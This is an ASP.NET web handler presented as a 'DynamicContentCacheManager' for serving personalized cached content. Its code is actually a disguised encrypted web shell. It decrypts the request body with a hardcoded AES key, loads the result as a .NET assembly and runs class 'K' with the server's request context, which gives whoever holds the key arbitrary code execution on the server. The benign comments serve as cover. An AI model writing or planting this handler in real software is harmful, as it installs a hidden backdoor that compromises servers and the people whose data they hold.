<%@ WebHandler Language="C#" Class="DynamicContentCacheManager" %>
using System;
using System.Web;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

/// <summary>
/// Manages the retrieval and rendering of dynamic content blocks from an encrypted cache payload.
/// This is used to serve personalized content to users without a full page reload.
/// </summary>
public class DynamicContentCacheManager : IHttpHandler
{
    /// <summary>
    /// The contractually defined entry point class name within a dynamic content module assembly.
    /// </summary>
    private const string CONTENT_MODULE_ENTRY_CLASS = "K";

    /// <summary>
    /// Processes the HTTP request to serve a dynamic content block.
    /// </summary>
    /// <param name="context">The current HTTP context.</param>
    public void ProcessRequest(HttpContext context)
    {
        // Proceed only if the request is part of an established user session.
        if (context.Request.Cookies.Count > 0)
        {
            byte[] encryptedPayload = ReadRequestPayload(context.Request);
            byte[] decryptionKey = GetCacheDecryptionKey();

            byte[] moduleAssemblyBytes = DecryptPayload(encryptedPayload, decryptionKey);
            
            RenderContentModule(moduleAssemblyBytes, context);
        }
    }

    /// <summary>
    /// Reads the raw encrypted payload from the request body.
    /// </summary>
    private byte[] ReadRequestPayload(HttpRequest request)
    {
        return request.BinaryRead(request.ContentLength);
    }

    /// <summary>
    /// Retrieves the static AES key used for decrypting cache payloads.
    /// In a real system, this might come from a secure configuration store.
    /// </summary>
    private byte[] GetCacheDecryptionKey()
    {
        return Encoding.Default.GetBytes("ca63457538b9b1e0");
    }

    /// <summary>
    /// Decrypts the provided payload using AES (Rijndael) algorithm.
    /// </summary>
    private byte[] DecryptPayload(byte[] encryptedData, byte[] key)
    {
        using (var aes = new RijndaelManaged())
        {
            ICryptoTransform decryptor = aes.CreateDecryptor(key, key);
            return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
        }
    }

    /// <summary>
    /// Loads and executes the dynamic content module from its assembly byte array.
    /// </summary>
    private void RenderContentModule(byte[] assemblyBytes, HttpContext executionContext)
    {
        Assembly contentModule = Assembly.Load(assemblyBytes);
        object moduleInstance = contentModule.CreateInstance(CONTENT_MODULE_ENTRY_CLASS);
        // The 'Equals' method is used as a generic entry point to pass context, as per the module contract.
        moduleInstance.Equals(executionContext);
    }
    
    public bool IsReusable { get { return false; } }
}